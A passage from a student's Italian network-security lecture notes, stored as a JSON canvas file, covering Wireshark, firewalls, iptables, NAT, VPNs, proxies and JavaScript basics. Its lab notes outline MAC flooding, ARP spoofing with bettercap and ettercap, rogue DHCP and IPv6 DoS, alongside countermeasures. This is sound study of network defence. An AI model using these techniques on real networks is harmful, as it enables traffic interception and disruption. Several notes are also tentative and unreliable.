indirizzi: uno stabile e `6` temporanei. <span style=\"color:rgb(236, 155, 14)\">... in teoria. In pratica fa un po' come gli pare, ma non mi interessa perderci tempo.</span>","x":-9570,"y":13932,"width":1259,"height":2413,"color":"4"},
		{"id":"ef928ca5c1df8fca","type":"text","text":"# Firewall","x":-8061,"y":13932,"width":759,"height":829,"color":"6"},
		{"id":"d2e5012a14662899","type":"text","text":"# NAPT","x":-8061,"y":15516,"width":759,"height":829,"color":"6"},
		{"id":"9f5441a3edad0cc9","type":"text","text":"# `Wireshark` - Cose Aggiuntive\n\n**Arricchire l'Analisi: Configurazione Aggiuntiva (Esempio GeoIP)**\n\nUna volta catturato il traffico (si spera con metodi legittimi!), l'analisi può essere arricchita. Un esempio è la risoluzione GeoIP in Wireshark:\n\n- Configurando Wireshark per usare database GeoIP (come quelli gratuiti di MaxMind GeoLite2), è possibile mappare gli indirizzi IP pubblici visti nel traffico alla loro posizione geografica approssimativa (nazione, città).\n- Questo richiede di scaricare i database e indicare a Wireshark dove trovarli (tramite `Edit → Preferences → Name Resolution → MaxMind database directories`).\n- Una volta configurato, si possono usare filtri potenti come `ip.geoip.country == \"China\"` per isolare traffico da/verso specifiche aree geografiche, aggiungendo contesto all'analisi.\n\n# CTF con Wireshark\n\nry to solve with wireshark the CTF of Hack3rCon 3 conference (2012)\n\nhttp://sickbits.net/other/hc3.pcap-04.cap\n\nhttps://drive.google.com/file/d/1ANd0t_U7Ya8R1fppcHhi51WYq9FjltM6/view?usp=drive_web&authuser=0\n\nè una cattura di pacchetti wifi dalla quale si può estrapolare una password, decrittare tutto il traffico e trovare la flag\n\n## cyberX? Una roba di ethical hacking con Leonardo","x":-8061,"y":12588,"width":759,"height":1105,"color":"1"},
		{"id":"9d40d5615a7f5616","type":"text","text":"# Cattura Standard o Aggressiva?\n\nOk, bella la promiscuous mode, ma se sei collegato ad uno ***switch*** è abbastanza inutile. Se i vecchi ***hub*** mandavano tutto a tutti, ora la rete è intelligente e multiplexa sulle porte. Ci sono però un paio di metodi per reindirizzare tutto il traffico su una porta di controllo:\n\n- ***Test Access Point*** (***TAP***) - Se ho accesso alla rete fisica, un TAP è un oggettino che si aggiunge tra router e switch e che copia il traffico senza interferire con esso;\n- ***Port Mirroring*** - Se lo switch è programmabile (***managed switches***), posso copiare direttamente tramite lui il traffico di porte o intere VLAN su una porta target su cui mi collego con Wireshark (o chi per lui).\n\nAltrimenti mi devo inventare qualcosa di meno pulito.\n\n- ***MAC Flooding*** - Bombardo lo switch con annunci di associazioni `(IP, Porta)` a caso. Ad un certo punto la cache CAM si riempie e inizia ad eliminare le associazioni più vecchie. Questo implica che il prossimo pacchetto destinato agli `IP` legittimi non troverà più una porta corrispondente, quindi lo switch va in ***fall-open***, i.e. regredisce alla fase di apprendimento delle associazioni ed è costretto a fare ***broadcast***. Tradotto, i pacchetti arriveranno anche a me che ascolto in promiscuous mode;\n\t- Chiaro che questa cosa ha una falla: appena il pacchetto arriva all'host giusto, questo risponde con un `ACK` e lo switch impara nuovamente l'associazione. Bisognerebbe quindi ricominciare da capo, a meno che non gioco d'anticipo facendo ***ARP Spoofing***, i.e. prima che il vero `IP Target` risponda, mi pubblicizzo io come `IP Target` sulla mia porta fisica (e.g. tramite `ettercap` o `cain&abel`);\n\t- Posso mitigare questa cosa con una ***Dynamic ARP Inspection*** (***DAI***), i.e. controllo le nuove associazioni `(IP, MAC)` cercando di individuare l'***ARP Poisoning***;\n\t- Si realizza con strumenti come `macof`.\n- ***DHCP Redirection*** - Aggiungo e pubblicizzo un server DHCP \"rogue\" (non autorizzato) sulla LAN, che inizia a richiedere un botto di `IP` al server legittimo portando alla ***DHCP Starvation*** (i.e. esaurisco gli `IP` della LAN secondo il server legittimo). A chi chiede un'assegnazione al rogue, quello risponde indicando l'`IP` dell'attaccante come default gateway. Ora tutto il traffico passa da me;\n\t- Effetto simile posso ottenerlo abusando del messaggio `redirect` di ***ICMP*** (`type 5`), usato dai router per pubblicizzare una rotta migliore. Di nuovo, `ettercap`;\n\t- Posso mitigare il problema definendo sullo switch delle porte \"trusted\". In questo modo so dove sono i server legittimi, e blocco i messaggi provenienti dai rogue.","x":-7052,"y":11248,"width":759,"height":1105,"color":"4"},
		{"id":"ad8bddc9d8394724","type":"text","text":"# `nftalbes`??\n\n`-j MASQUERADE` per il routing??","x":-6240,"y":16420,"width":759,"height":268},
		{"id":"99000e11f7a10da1","type":"text","text":"Da qui in poi approfondiamo in ordine sparso\n\n- Sicurezza IPv6 - Lab4\n- Attacchi Link-Local - Lab3\n- ACME","x":-9569,"y":19260,"width":1258,"height":300},
		{"id":"54d3afedf0d0dad7","type":"text","text":"# SPACING","x":-7302,"y":16116,"width":250,"height":235,"color":"5"},
		{"id":"7bf1e73f4cdb5397","type":"text","text":"# NAT ([RFC 1918](https://www.rfc-editor.org/rfc/rfc1918.html), 1996)\n\nserve anche ad implementare roba tipo `IPv6` over `IPv4`, private to private (IP) nel senso non solo privato mascherato con un pubblico + porta\n\nnon è proprio vero che gli IPv4 pubblici sono unici. Pensa a DNS. L'IP di un root nameserver nasconde dietro N servers. dipende da chi pubblicizza quell'indirizzo pubblico.\n\nUna buona risposta al DDOS è ad esempio che qunado mi rendo conto di essere bersagliato faccio pubblicizzare lo stesso IP a diversi ISP in modo da distribuire il traffico (anycast). Questa roba la fa Cloudfare.\n\nshared address space `100.64/10` (quindi da 100.64.x.x a 100.127.x.x) implementa internal routing. eg. Fastweb usa sta roba per il routing interno all'Italia.\n\n\"NAT is an intrinsic firewall\"\n\nproblemi del NAPT:\n\n- se cambio la porta devo cambiare il checksum di TCP/UDP;\n- encryption - se critto il payload di IP è un casino per il NAPT. IPSec è un problema! il firewall rompe l'integrità del pacchetto (oltre al fatto che può rompere la confidenzialità, essendo di fatto un MitM?)\n- gestione delle incoming requests. il NAPT di default blocca tutte le connessioni in ingresso (slide 14)\n\nDMZ espone un host privato direttamente ad Internet, i.e. mando a lui tutte le requests esterne che non sono originate dall'interno. non una grande idea in generale.\n\n(salto di disattenzione)\n\nvedremo alcuni protocolli ma non kerberos\n\npoi arriva fino a slide 30 tipo ma ormai ho perso l'attenzione\n\n\n","x":-7051,"y":15553,"width":759,"height":798},
		{"id":"9c265ba29c9c5e68","type":"text","text":"# ACME\n\nscarichi il file di configurazione `.ovpn`, esegui `sudo openvpn --config filediconfigurazione.ovpn`, questo genera una nuova interfaccia `tap0` che è un cavo ethernet virtuale verso la rete interna `100.100.roba`. Non ho ben capito dove siamo precisamente, da capire.\n\nContattiamo quindi `100.64.0.2:8006`, che però a quanto pare è un indirizzo esterno al quale posso accedere solo da dentro? Penso questo perché il suo traffico passa da tap0 (visto con wireshark) e senza VPN non mi ci fa accedere. L'altra domanda sarebbe: come faccio a sapere quale traffico far passare per `enp0s3` e quale per `tap0`??\n\nSta di fatto che in questo `100.64.0.2:8006` ci sta un pannello di controllo per tutto l'environment ACME virtuale. accendiamo alcune macchine, tra cui fondamentale `client-ext-1` e `main-firewall-router`. Dal primo facciamo `dhclient` e otteniamo un ipv4, quindi accediamo da browser a `100.100.4.1` che è il `main-firewall-router`. Nota che non riesco ad accederci da browser della VM, quindi non siamo collegati su questa subnet con tap0.\n\nOra, quelle due VM sono connesse (vedi topologia in basso a sx). Ci sono altre due VM con immagine un computerino (che mi pare siano le uniche per le quali ci sono le credenziali di login): una è `internal-firewall-router` (autoesplicativo, nonché presente nella topologia) e `kali.acme-03`, che secondo me nella foto della topologia è PC (infatti se eseguo `dhclient` non funziona finché non avvio `internal-firewall`, il che significa che è il router a cui fa riferimento).\n\nIn ogni caso segue setup del server DNS, che vale solo per la rete locale (per richieste tipo google.com sei ancora costretto ad andare all'esterno). Questa cosa si fa dal file `/etc/dnsmasq.conf` secondo le indicazioni del video su classroom\n\nper aggiungere un nuovo host al dns server, aggiungere al file `/etc/hosts` la nuova coppia `IP NOME` (lui mette sia ipv4 che ipv6 su due linee separate, e per ognuna mette due nomi: uno \"pulito\" tipo `webserver` e uno con il dominio tipo `webserver.acme-03.test`) e poi `sysctl restart dnsmasq` per ricaricare subito i nuovi parametri. segue ping per testare i nomi.\n\nper testare il dnsserver possiamo scrivere `host webserver 100.100.1.2` da un'altra macchina (tipo log). In pratica manda una richiesta dns all'indirizzo `100.100.1.2` per risolvere il nome `webserver`. Vabbè visto che nel setting del dnsserver c'è il dnsserver stesso faccio `host dnsserver 100.100.1.2` così mi compare sul terminale della macchina l'IPv6 del dnsserver che altrimenti sarebbe una roba lunga da copiare a mano e lo metto in `/etc/resolv.conf`.\n\n","x":-9569,"y":22192,"width":1258,"height":2413},
		{"id":"4440af3189433244","type":"text","text":"# VPN 9/5\n\nssl/ipsec sono implementazioni di vpn, e ce ne sono molte altre\n\nnetwwork costruita on top on a network considerata non sicura (in qualsiasi senso: anonimity, confidenciality, ...). quasi sempre si mette encryption. DOVE la metti dà diverse proprietà. tipo, VPN su ACME serve all'authentication (access control, in base a chi sei hai diversi permessi).\n\nse vuoi confidenciality devi crittare i payload, per anonimity devi farlo con gli header (tipo TOR che critta letteralmente tutto). slide 7 : IPsec not simple\n\nencrryption si può realizzare a livello\n\n- fisico - l'unico esempio che gli è venuto è con la quantistica, i.e. se misuro non sono in grado di replicare la funzione d'onda (obv non l'ha detto così, ma intende quello)\n- DLL - a livello ethernet, proteggo da là in su (IP etc). Questa ovviamente è solo local protection, quindi non funziona per Internet. Esempio?\n- Rete - il primo layer utile su Internet. IPsec. end-to-end, source-destination. Questo richiede una chiave per ogni coppia source-dest su internet. \"good for site-to-site, meno per host-to-site\" perché? dovrei fare troppe chiavi? Così dice pare\n- Trasporto - esistono protocolli qui che proteggono anche i livelli inferiori (come?? tunnel mode??)\n- Application - non è più vpn, banalmente ogni app singola deve crittare il payload finale.\n\nTunneling: stabilisco un canale sicuro sulla rete insicura (site-to-site) tramite encapsulation. se non guardo sicurezza, prendo i dati e li metto in IP. facile. in altre parole, uso in protocollo noto (IP)  per portare su Internet un protocollo non noto. se poi critto la roba dentro ottengo un secure tunnel, i.e. una VPN.\n\nse faccio così, internet vede solo un collegamento tra due endpoint. non c'è alcuna info su chi ha mandato o deve ricevere (neanche con la porta, perché sta tutto scritto nell'header VPN). tutto questo può essere realizzato con IPsec, SSL e altra roba.\n\ninvece di mandare tutto nel canale (full tunneling) posso riservarlo ad alcuni dati (split tunneling, tipo ACME: solo il traffico diretto a 100.12.1.3 non mi ricordo va nella vpn, anche perché serve solo per l'autenticazione).\n\nquesto si realizza con le routing tables (usually in a firewall device, ma non per forza). a seconda che sia sul bordo o dentro si chiama VPN (external?) o internal. Altrimenti si può mettere in DMZ. Insieme alle cose esposte ad Internet e a cose tipo IDS. DMZ può fare da filtro, in pratica. meglio la variante dual interfaces probabilmente, ma guarda meglio le slides.","x":-11360,"y":19006,"width":796,"height":987},
		{"id":"228a3066f58af835","type":"text","text":"# SSL/TLS\n\nsicurezza su TCP, che diventa protetto con authentication e (confidentiality?)\n\nsegue descrizione del protocollo. e delle certification authorities \"you can expect a question on that\".","x":-11360,"y":20086,"width":796,"height":440},
		{"id":"6b4435af9416b730","type":"text","text":"# `sysctl`","x":-4531,"y":17532,"width":759,"height":1105,"color":"6"},
		{"id":"1df407eb2a945234","type":"text","text":"# Injection, Hijacking & DoS su Connessioni TCP\n\nUna connessione TCP ha diversi punti deboli, sfruttabili in diversi modi.\n\nPosso fare ***spoofing*** per arrivare all'***injection***. Mando una richiesta `SYN` dichiarando di essere l'`IP` del client (generando quindi un `x` casuale). Il server risponde all'`IP` del client generando un `y` casuale. Visto che la risposta non è indirizzata al mio `IP`, non posso vedere `y`. Per aprire la connessione dovrei quindi mandare un `ACK` con il giusto `y + 1`.\n\nQuesta roba è vecchia, nel senso che oggi è difficile fare TCP Spoofing. `y` è randomizzato bene, e qualsiasi risposta del vero client (che si vede arrivare risposte a domande che non ha mai fatto) induce il server a rendersi conto che c'è un problema e a chiudere tutto.\n\nUn'altra roba poco verosimile oggi è un ***TCP Hijacking***, i.e. dirottare la connessione già esistente in modo da sostituirmi al client. Questo ovviamente presuppone sniffing dei pacchetti (devo leggere i numeri di sequenza).\n\nSono molto simili in realtà","x":-5240,"y":18949,"width":759,"height":924,"color":"#4545ff"},
		{"id":"24329f55583836be","type":"text","text":"# Lab 8 maggio ATTACCHI LINK LOCAL\n\nprima wifi securiy er wired-equivalent privacy (cerca, tipo che tutti hanno la stessa chiave di crittografia). se intercetti i primi pacchetti di una connessione (e.g. con AirCrack su Kali) puoi risalire alla chiave. oggi ogni host usa una chiave dedicata, come se fosse una connessione punto-punto (diverso quindi da wired equivalent privacy). bridge è collegamento tra due ethernet, swich è bridge multiport (?)\n\nvabbè qui l'idea è provare a fare attacchi link local.\n\n1999 ***CAM Overflow*** con `macof`. Quello che succede dopo non è ovvio. Se lo switch inizia a fare flooding daje, altrimeni potrebbe crashare o bloccarsi. per difendermi faccio port security, i.e. ogni porta può ricevere pacchetti da massimo N MAC Addresses. Se ne arrivano di più, stacco la porta.\n\nAltrimenti ARP Spoofing, come descritto sopra (cfr Cattura Standard o Aggressiva?). Gli switch hanno le CAM tables (MAC/PORTA) mentre gli host hanno le ARP tables (IP/MAC). Unused MAC are removed. come faccio spoofing? esiste una gratuitous ARP response che è tipo una unsolicited advertisement con cui pubblico la mia associazione. l'host 1.1.1.2 si pubblicizza ripetutamente come 1.1.1.254 (il router) in modo che tutti passino da lui. posso iniziare a pensare di fare MitM. Posso farlo con il router, il DNS, un altro host...\n\ncontromisure? se uso SSH/SSL posso ancora fare questo attacco ma diventa più difficile. Vedi VPN?? ( why )\n\n\nLAB\n\nbettercap ha diversi modi per funzionare, tra cui GUI e CLI. La seconda è come una shell con comandi e ha diversi script preimpostati\n\n- net.probe on - attiva un arp scan, mentre net.show ti mostr tutti quelli trovati in tabella. quando fai `on` su qualcosa quello inizia a runnare in background\n- controlla anche i vari `set` come\n\t- gateway.address XXX\n\t- arp.spoof.\n\t\t- internal true\n\t\t- fullduplex true\n\t\t- targets XXX YYY ZZZ per specificare su chi devo fare spoofing (posso fare più interfacce sullo stesso collegamento fisico? penso di sì, ipv6 mette almeno un link local e un GUA)\n\n\nil risultato del poisoning è che alla fine tutti associano tutti gli indirizzi allo stesso MAC (se metto tutti come target, altrimenti è switchato solo il target. cioè se il target è A con MAC B e io sono C con MAC D, alla fine del processo tutti gli altri vedranno A con MAC D e C con MAC D).\n\nfamo che il target è il server. se qualcuno manda una syn per aprire una connessione col server, la manda al mio mac. io però faccio una retransmission (quindi bettercap è visibile, in qualche modo. wireshark lo vede che stai ritrasmettendo.) per reindirizzarla al server. Ovviamente (?) questo è inutile su un cavo ethernet condiviso da tutti, ma è efficace se c'è di mezzo uno switch.\n\nDetta così sembra inutile. A che serve solo reindirizzare? Vabbè a leggere, ma posso anche modificare! è il momento del proxy script! Vedi rec... in pratica è uno (java)script che cerca il body e sostituisce kitten.jpeg con un'altra foto. Tutto questo obv perché sono in chiaro.\n\nprocede con le stesse cose versione IPv6 mi sa\n\nun DoS con IPv6 è: quando fai DAD ti dico che l'indirizzo che hai scelto non va bene. a spam. non prenderai mai un GUA e non ti collegherai mai alla rete.\n\npoi spoofing se posso creare dei messaggi rogue RA (obv). se poi faccio flooding di RA ci sono i vecchi SO che li processano tutti, quindi proprio DoS easy\n\nin modo analogo posso fare da rogue DHCP server, DNS, e abusare di redirect.\n\nsegue ex4 ed ex5 sulla falsariga di ciò. vedi rec perché mi so scocciato dopo due ore e mezza","x":-7301,"y":18204,"width":1259,"height":2413},
		{"id":"0a2425b5c932bbd1","type":"text","text":"# 04.04 - Firewall\n\ntrade off tra effort di deep packet inspection ed effettiva efficacia del firewall.\n\nusiamo iptables e un altro perché sono open source, diverse aziende ne usano diversi (con diverse sintassi). Tre livelli di astrazione:\n\n- policy (natural language)\n- corresponding filter rules\n- implementing filters /w right syntax\n\nraro andare in application layer, al più ci si ferma a trasporto (filtro su TCP/UDP). Se serve c'è un filtro apposito per l'application layer, ma più interno: l'idea è avere una catena di firewall tali che quello esterno filtra su IP (DLL non è davvero necessario in genere), poi dentro faccio un filtro \"finer grain\". Credo si chiami defense-in-depth: multiple overlapping system, anche con redundancy (se uno di loro faila, ce ne sono altri), è balance tra difesa e complessità.\n\nUn firewall è un router che però non forwarda tutto. Con che logica? Le filter rules. Access Control List (ACL) è il primo livello di filtro.\n\nslide 7 - principi di design che lui dice \"potrei entrare in dettaglio, ma suvvia, sono ovvi\". Guardali lo stesso perché sta gente fa cybersec da quando e nata e tu no.\n\nhost based - firewall su pacchetti diretti ad un particolare host, non filtro sulla rete in generale. ufw, pf su unix?\n\nACL è il firewall come te lo immagini, si chiama screening router. whitelist/blacklist differenti per incoming/outcoming traffic. Questo setup è stateless (\"no context, only content\")\n\nLivello 2 - Dual Homed Host (or Bastion Host). Non solo ACL, qualcosa in più: è dedito a proteggere con un SW, ma ha SOLO quello. Si parla di hardening quando tolgo tutte le altre possibili cose fancy che potrebbero rivelarsi vulterabilità.\n\nDMZ - piccola rete interna che posso esporre ad internet.\n\nGuarda slides per configurazioni possibili.\n\nslide 17 - ad esempio per accedere ad internet dall'internal zone potrei essere costretto a passare per la dmz.\n\nslide 21 - nota che outgoing interface... no non ho capito. A me sembra ovvio ma forse no.\n\nrules sono organizzate in chains, vedi HowToFirewall sopra.\n\nvedi slides per esempi di regole\n\nslide 31 - \"blocco il traffico incoming con IP identici a quelli interni\" eh ma con gli indirizzi privati che ormai sono pubblici? che facciamo?\n\nmolti firewall bloccano lo spoofing. potrei però appoggiarmi ad un proxy e dirgli di fare spoofing al posto mio?\n\nporta >1023 -> è una risposta. poi fa un esempio di regole che sembrano buone ma non lo sono. pensa sempre a come attaccare le regole dall'esterno (e guarda la rec).\n\n(vabbè ma qui il punto è: faccio regole perfette e permetto solo una connessione (e.g smtp) legittima, nel senso sulle giuste porte. Chi vieta all'attaccante di mettere nel payload della roba brutta in delle richieste legittime? tipo fare injection o simili? vabb questa è na cosa mia, non l'ha detto, ma forse si risolve con IDS e simili)\n\npoi fa problemi di frammentazione IP e SYN flooding tipo e introduce i firewall stateful. in pratica connection tracking networks servono a verificare che i singoli pacchetti abbiano senso all'interno di una connessione. \n\nriguardati bene il funzionamento di TCP.\n\nquesto vale per i protocolli stateful. e per quelli stateless, tipo ping request, ICMP, HTTP? Il firewall stesso crea la nozione di connessione anche tipo su UDP. Cioè, anche se la connessione in sé non esiste, il firewall tiene traccia del flusso per un certo periodo di tempo per controllare cosa succede. Non è troppo difficile, vedrai un match tra source/destination che si invertono nel pacchetto nel verso opposto (richiesta/risposta). Posso in questo modo accettare roba dall'esterno solo se la connessione viene originata da un computer interno alla rete.\n\n`iptables` può implementare stateful firewall.\n\ninfine abbiamo il livello proxy, cioè scendo fino all'applicazione. Qui andiamo su roba super application-specific. è difficile parlare di firewall in questo caso, perché ogni applicazione ha il suo. piuttosto a questo livello arriva l'IDS per capire cosa c'è nel pacchetto.\n\nè molto utile per protezione da varie ed eventuali, tipo injection e simili. è limitato però da TLS ed encryption in generale, quindi non è ovvio capire cosa c'è nei pacchetti.\n\nSOCKS? riascolta sta parte (tcp relay, simile al tor routing)\n\nsaltato una slide perché mi sono distratto 12 secondi\n\nNG-Firewalls introduce un botto di roba","x":-7051,"y":13356,"width":759,"height":1982},
		{"id":"2ef2012b457473ef","type":"text","text":"# `iptables` - HowToFirewall\n\nOgni pacchetto che transita nel sistema Linux  viene valutato secondo un set di regole che definiscono se e come inoltrarlo. Tali regole sono definite in `iptables`.\n\nLe regole sono organizzate in ***chain***, liste ordinate che permettono di valutarle in sequenza (i.e. la prima regola verrà valutata per prima). \n\n- `-t [table]` - Specifica il tipo di regole da visualizzare o modificare:\n\t- `filter` - Regole che definiscono quali pacchetti accettare, inoltrare o bloccare. Le chain principali di questa tabella sono `INPUT` (regolamenta il traffico in ingresso), `OUTPUT` (in uscita) e `FORWARD` (se decidiamo di comportarci da router);\n\t- `nat` - Regole di `NAPT`;\n\t- `mangle` - Regole di modifica dei pacchetti (e.g. cambiare il `TTL`).\n- `-L` - Mostra le regole. Di norma si usa insieme ad opzioni per migliorare la leggibilità, tipo `-v` (`verbose`), `-n` (evita di risolvere i nomi con `DNS`) e `--line-numbers` (utile se mi serve capire quale regola cancellare);\n- `-A`, `-I` - Aggiungono una regola, rispettivamente, alla fine e all'inizio della chain su cui vengono chiamate (e.g. `iptables -A INPUT -s 192.168.1.100 -j DROP`  aggiunge in coda la regola `droppa tutto ciò che arriva da 192.168.1.100`);\n\t- `-j` - Definisce la regola in sé (e.g. `DROP`, `ACCEPT`, ...).\n- `-D` - Rimuove una regola (e.g. `iptables -D INPUT 1` rimuove la prima regola di `INPUT`);\n\t- `-F` (`flush`) - Cancella tutte le regole.\n- `-R` - Modifica una regola esistente;\n- `-N` - Crea una nuova chain <span style=\"color:rgb(236, 155, 14)\">magari poi ci torniamo</span>;\n- `-P` - Imposta una policy complessiva (e.g. `iptables -P INPUT DROP` blocca tutto il traffico in ingresso, <span style=\"color:rgb(236, 155, 14)\">eventualmente sta ad una regola nella chain permettere a qualcosa di specifico di entrare con una direttiva `ACCEPT`</span>).\n\n`iptables` di per sé ***non salva le regole al reboot***. Se voglio preservarle devo salvarle (con `iptables-save > /etc/iptables.rules`) e poi ripristinarle al riavvio (`iptables-restore < /etc/iptables.rules`).\n\n","x":-6080,"y":14686,"width":759,"height":867,"color":"3"},
		{"id":"964066c372c53cb2","type":"text","text":"# SLAAC DHCPv6 m43","x":-8020,"y":14964,"width":439,"height":175,"color":"1"},
		{"id":"98ddc534ba23fd4e","type":"text","text":"# Proxy 16/05\n\n##### forward proxy\n\npenso che il punto della slide 5 sia dire che mentre normalmente se mi connetto al server scrivo la get come `get path/doc.html HTTP/1.0`, se sono connesso con il proxy devo aggiungere il nome del server nella richiesta `GET`. Credo eh, controlla. Posso anche specificare protocolli diversi nella get (e.g. ftp, slide 6)\n\nIl punto è che essendo una middlebox tra client e server puoi farci ACL, blacklist e check sulle risposte, il tutto a livelli alti (applicazione, cosa che invece un firewall non fa).\n\ncaching pensato originariamente per ovviare al problema della lentezza delle connessioni (così ti metti cose pesanti più vicine ai client). in quest'ottica ha anche senso l'esistenza del metodo HEAD. Approfondisci CONNECT slide 8. Ok lo fa alla slide dopo. quando dice unmodified intende che il proxy non è inteso per capire quello che dico (forwarda il byte stream, non si occupa di fare delle richieste per te (i.e. in questo caso dovrebbe CAPIRLE)).\n\ntutto ciò ha un problemino con TLS. Se mi connetto HTTPS lo sto facendo con il proxy, nulla mi dice che lui critti i dati verso il server. Quindi non si fa, piuttosto si usa CONNECT: uso HTTP classico fino al proxy, dopodiché negozio le chiavi di TLS direttamente col server. A quel punto il router diventa identico ad un qualsiasi router su internet, ed è per questo che i proxy spesso vietano la CONNECT. Magari questo proxy viene usato per diffindere malware e lui non lo sa.\n\n- variante SSL Forward Proxy - l'idea è decrittare il traffico del client e poi crittarlo di nuovo (e.g. tramite burp suite proxy SSL). Usato da banche, militari, compagnie grosse ecc. Anche se uso HTTPS il proxy ispeziona quello che faccio. a na certa inizia a chiamarlo firewall, boh\n\t- in pratica il firewall ti invia un certificato che dice `SONO GOOGLE!!`, ma è rilasciato ad esempio da una certa `Burp Certificate Authority`. Questo si vede analizzando il pacchetto (forse lo vede anche il browser?)\n\t- anche detto SSL strip (?), puoi farci MitM.\n###### anonymizer proxy\n\nvoglio cambiare il source ip delle mie richieste. mi fido del proxy e gli do i miei dati sostanzialmente. questi servizi sono offerti da hidemyass, nordvpn, ... paghi e ti fidi.\n\n\n###### reverse proxy\n\nfa da proxy al server, molto comune oggi (tipo 90% delle connessioni oggi. non è mai il server a gestire le richieste, ma una pletora di suoi proxy, che dovrebbero essere le repliche cfr. distributed systems).\n\nTLS acceleration ha senso se i proxy sono vicini al server (i.e. implemento TLS che è pesante solo sul proxy, poi la connessione proxy-server è in chiaro quindi leggera). di buono c'è che se il server di suo non implementa TLS con il proxy posso fornire HTTPS (fantastic coffe su ACME sua HTTP ma possiamo renderlo HTTPS)\n\n- questa roba se capisco bene si chiama SSL Termination (slide 20, perché l'ordine è tutto mischiato???)\n- altrimenti SSL forwarding?\n\nslide 17 dice roba figa per IoT. il gateway fa da reverse proxy??\n\n<span style=\"color:rgb(236, 155, 14)\">segui a lungo la lezione prima di scrivere qualsiasi cosa, l'ordine in cui affronta le cose è strano e potrebbe rispondere a dubbi o dare altri pezzi del puzzle in momenti inattesi</span>\n\na circa 30 minuti dalla fine fa roba che dice essere tricky\n\n","x":-11360,"y":20720,"width":796,"height":2360},
		{"id":"2e6fc09bc131f5f0","type":"text","text":"# Inserire e Scrivere Codice `JavaScript`\n\nUn codice `JavaScript` si trova tipicamente in un file `.js`, ma può essere inserito in una pagina `HTML` tramite la direttiva `<script>`. Ho due alternative:\n\n- Inserisco direttamente il codice dentro la sezione `<script>`, tipo\n```html\n\t<script>\n\t\talert( 'hello!' );\n\t</script>\n```\n\n- Chiamo il file `.js` contenente il codice che voglio eseguire, i.e.\n```html\n\t<script src=\"/path/to/script1.js\"></script>\n\t<script src=\"/path/to/script2.js\"></script>\n\t...\n```\n\nSe uso entrambi i metodi insieme, il codice inserito con il primo metodo verrà ignorato. Il secondo metodo è inoltre preferibile per i ben noti principi di modularità del codice.\n\nDetto questo, gli `statement` si possono separare con `;` come in `C`, ma `\\n` ha quasi sempre lo stesso effetto (ci sono controesempi, e.g. se vado a capo dopo \"`+`\" `JavaScript` si rende conto che l'espressione è per forza incompleta e non aggiunge `;`). Nel dubbio meglio mettere il `;`, se non sei sicuro di quello che fai potresti avere comportamenti strani.\n\nSpesso inoltre potresti trovare una strana dicitura `\"use strict\";` ad inizio codice. Questa riga è là per una questione di compatibilità, e impone al codice di fare riferimento a delle modifiche attuate da un certo aggiornamento in poi (sì, è terribile ma funziona così).\n\nI commenti funzionano come in `C`: `//` sulla linea (shortcut frequente `CTRL+/`), e `/* [...] */` su più linee (`CTRL+SHIFT+/`). Le variabili sono dichiarate dalla direttiva `let` (evoluzione della vecchia direttiva `var`), che un po' in stile `Python` ti permette di fare cose tipo\n\n```javascript\nlet user = 'John', age = 25, message = 'Hello';\n```\n\nI tipi primitivi vengono gestiti come in `Python`. Puoi visualizzarli con `typeof` e fare `cast` con funzioni ovvie. Come si visualizza il contenuto di una variabile? Nota le differenze:\n\n```javascript\nlet str = \"Hello\";\nlet str2 = 'Single quotes are ok too';\nlet phrase = `can embed another ${str}`;\n```\n\nPer usare le funzioni entro le stringhe, devi usare le `backtick`.","x":-11592,"y":8600,"width":759,"height":1072,"color":"4"},
		{"id":"75d22476aa1bc441","type":"text","text":"# Direttive Frequenti & Funzioni\n\n- `alert(\"string\")` - Scrive `string` su una finestra di notifica, l'esecuzione del codice non prosegue finché l'utente non dà l'`OK`;\n- `x = prompt(\"string\", [default])` - Stessa cosa, ma fornisce la possibilità di inserire qualcosa in `input`, che verrà poi salvato in `x`. Il secondo parametro è opzionale e indica cosa appare scritto come suggerimento di default;\n- `result = confirm(\"question\")` - Autoesplicativo, fa una domanda e accetta risposta `OK` (`True`) o `Cancel` (`False`), che viene poi salvata in `result`;\n- `if (condition)` - Identico a `C`, anche nella versione con l'operatore `?` (i.e. `let result = condition ? value1 : value2;`. Può essere anche concatenato:\n\n```javascript\nlet message =   (age < 3) ? 'Hi!' : \n\t\t\t\t(age < 18) ? 'Hello!' : \n\t\t\t\t(age < 100) ? 'Greetings!' : 'What an unusual age!';\n```\n\n- `??` - Detto \"`nullish coalescing operator`\", la scrittura `a ?? b` restituisce `a` se questa non è `null` o `undefined`, altrimenti la seconda. Si può quindi tradurre come\n\n```javascript\n(a !== null && a !== undefined) ? a : b;          // Tipo\nalert(user ?? \"Anonymous\");                       // è identico a\nalert(firstName || lastName || nickName || \"Anonymous\");\n```\n\n- `while`, `do while`, `for`, `switch` - Identici a `C`. Nel `for` posso skippare una qualsiasi delle tre condizioni (anche tutte, nel qual caso va avanti all'infinito, ci devo mettere comunque due `;`), non ricordo se in `C` si può fare (mi sa di no). Qui esistono anche `break` (esce dal ciclo) e `continue` (va alla prossima iterazione del ciclo).\n\nLe ***funzioni*** sono una via di mezzo tra `C` e `Python`, essendo una roba del tipo\n```javascript\nfunction name(parameter1, parameter2, ... parameterN) {...} // Oppure\nlet name = function(parameter1, ...) {...};\n```\nDiciamo che graffe e `;` a parte puoi pensare di star scrivendo in `Python` (... per come si comportano le funzioni, quindi tipo parametri opzionali, valore di ritorno, ...)","x":-11592,"y":7440,"width":759,"height":924,"color":"4"},
		{"id":"9b0ccd7a1f5d0648","type":"text","text":"# Funzioni di Funzioni\n\nPosso passare intere funzioni come parametri ed eseguirle in modo ricorsivo:\n```javascript\nfunction ask(question, yes, no) {\n\tif (confirm(question)) yes()\n\telse no();\n}\n```\n\nChi sono le funzioni `yes()` e `no()`? Posso crearle con una dichiarazione\n\n```javascript\nfunction showOk() {\n\talert( \"You agreed.\" );\n}\n\nfunction showCancel() {\n\talert( \"You canceled the execution.\" );\n}\n```\n\ne poi chiamarle (eventualmente più volte nel codice, pertanto sono dette ***callback***) con\n\n```javascript\nask(\"Do you agree?\", showOk, showCancel);\n```\n\noppure fare entrambe le cose insieme:\n\n```javascript\nask(\n\t\"Do you agree?\",\n\tfunction() { alert(\"You agreed.\"); },\n\tfunction() { alert(\"You canceled the execution.\"); }\n);\n```\n","x":-12601,"y":7440,"width":759,"height":924,"color":"4"},
